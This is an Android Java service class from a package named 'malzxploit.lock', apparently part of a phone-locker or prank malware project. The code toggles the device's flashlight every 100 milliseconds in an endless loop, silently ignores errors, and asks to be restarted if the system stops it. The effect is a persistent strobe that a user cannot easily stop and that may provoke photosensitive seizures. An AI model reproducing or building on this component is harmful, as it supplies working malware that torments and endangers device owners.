package com.malzxploit.lock;

import android.app.Service;
import android.content.Context;
import android.content.Intent;
import android.hardware.camera2.CameraAccessException;
import android.hardware.camera2.CameraManager;
import android.os.Handler;
import android.os.IBinder;

public class StrobeService extends Service {

    private CameraManager camManager;
    private String cameraId;
    private boolean isOn = false;
    private boolean running = true;

    @Override
    public void onCreate() {
        super.onCreate();
        try {
            camManager = (CameraManager) getSystemService(Context.CAMERA_SERVICE);
            if (camManager != null && camManager.getCameraIdList().length > 0) {
                cameraId = camManager.getCameraIdList()[0];
            }
        } catch (Exception ignored) {}
        startStrobe();
    }

    private void startStrobe() {
        final Handler handler = new Handler();
        Runnable blink = new Runnable() {
            @Override
            public void run() {
                if (!running) return;
                try {
                    if (camManager != null && cameraId != null) {
                        isOn = !isOn;
                        camManager.setTorchMode(cameraId, isOn);
                    }
                } catch (Exception ignored) {}
                handler.postDelayed(this, 100);
            }
        };
        handler.post(blink);
    }

    @Override
    public int onStartCommand(Intent i, int f, int s) {
        running = true;
        return START_STICKY;
    }

    @Override
    public void onDestroy() {
        running = false;
        try {
            if (camManager != null && cameraId != null) {
                camManager.setTorchMode(cameraId, false);
            }
        } catch (Exception ignored) {}
        super.onDestroy();
    }

    @Override
    public IBinder onBind(Intent i) { return null; }
}
